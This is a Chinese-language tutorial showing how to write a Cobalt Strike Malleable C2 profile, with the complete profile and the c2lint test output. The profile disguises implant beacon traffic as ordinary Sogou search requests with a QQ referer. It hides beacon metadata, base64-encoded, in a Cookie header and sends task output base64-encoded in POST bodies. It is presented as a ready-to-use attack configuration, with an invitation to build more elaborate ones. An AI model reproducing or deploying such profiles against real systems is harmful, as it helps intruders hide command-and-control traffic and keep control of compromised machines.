# 0x00 profile编写

先设置Beacon的默认值

```
#
#
#Author :@404
#
#
set sleeptime "3000";
set jitter "10";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";

```

设置心跳时间为3s,jitter随便但是不要太大这是心跳时间抖动。然后设置我们的get请求

```
http-get{
    set uri "/hdq=sogou-wsse-3f7bcd0b3ea82268&ie=utf-8&query=1";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
        header "Host" "www.sogou.com";
        header "Referer" "https://www.qq.com/";

        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }

    }

    server {
        header "Server" "nginx";
        header "X-Log-Ext" "antiforbidden=1&exp_1=1&exp_2=1";
        output {
        print;
        }
    }

}

```

client：

设置url 目标机器请求的header头和参数，其中metadata的流传如下

0|开始|过程|数据
-|-|-|-|
1 | 开始 | null | test
2 | base64 | base64 encode | dGVzdA==
3 | prepend "session=" | 获取字符串组合 | session=dGVzdA==
4 | header "Cookie" | 储存在cookie字段中 |Cookie：session=dGVzdA==

server：

为服务器返回给他的数据


output：

print 发送数据


```
http-post{
    set uri "/hdq=&query=1";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
        header "Host" "www.sogou.com";
        header "X-Requested-With" "XMLHttpRequest";
        header "Referer" "https://www.qq.com/";


        id {
            parameter "aleen";
        }
        
        output {
            base64;
            print;
        }

    }

    server {
        header "Server" "nginx";
        header "X-Log-Ext" "antiforbidden=1&exp_1=1&exp_2=1";

        output {
        print;
        }
    }

}

```

POST类似但是要把metadata换成id,id中aleen参数插入随机数 也可以指定如parameter "aleen" "isme", output这里用的base64编码输出,其他类似。

然后组成如下脚本

```
#
#
#Author :@404
#
#
set sleeptime "3000";
set jitter "10";
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";

http-get{
    set uri "/hdq=sogou-wsse-3f7bcd0b3ea82268&ie=utf-8&query=1";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
        header "Host" "www.sogou.com";
        header "Referer" "https://www.qq.com/";

        metadata {
            base64;
            prepend "session=";
            header "Cookie";
        }

    }

    server {
        header "Server" "nginx";
        header "X-Log-Ext" "antiforbidden=1&exp_1=1&exp_2=1";
        output {
        print;
        }
    }

}

http-post{
    set uri "/hdq=&query=1";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
        header "Host" "www.sogou.com";
        header "X-Requested-With" "XMLHttpRequest";
        header "Referer" "https://www.qq.com/";


        id {
            parameter "aleen";
        }

        output {
            base64;
            print;
        }

    }

    server {
        header "Server" "nginx";
        header "X-Log-Ext" "antiforbidden=1&exp_1=1&exp_2=1";

        output {
        print;
        }
    }

}

```

运行 ./c2lint 

```
[+] Profile compiled OK

http-get
--------
GET /hdq=sogou-wsse-3f7bcd0b3ea82268&ie=utf-8&query=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Host: www.sogou.com
Referer: https://www.qq.com/
Cookie: session=CaY+3QMvbHC266iAYrHLWg==
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

HTTP/1.1 200 OK
Server: nginx
X-Log-Ext: antiforbidden=1&exp_1=1&exp_2=1
Content-Length: 64

.Gf...!.p(...3.I......T.O..s./.r.A.....`M........+m.....]m....4:

http-post
---------
POST /hdq=&query=1?aleen=88225 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Host: www.sogou.com
X-Requested-With: XMLHttpRequest
Referer: https://www.qq.com/
Content-Length: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

1Fk7/RwM3u36an1hXuJSEA==

HTTP/1.1 200 OK
Server: nginx
X-Log-Ext: antiforbidden=1&exp_1=1&exp_2=1
Content-Length: 0

```


c2lint 可以为我们测试脚本数据以及代码的bug 一路绿灯说明你的代码是没的问题的,这只是个简单的脚本你可以编写更加困难的。


# 0x01 文末


### 本文如有错误，请及时提醒，以免误导他人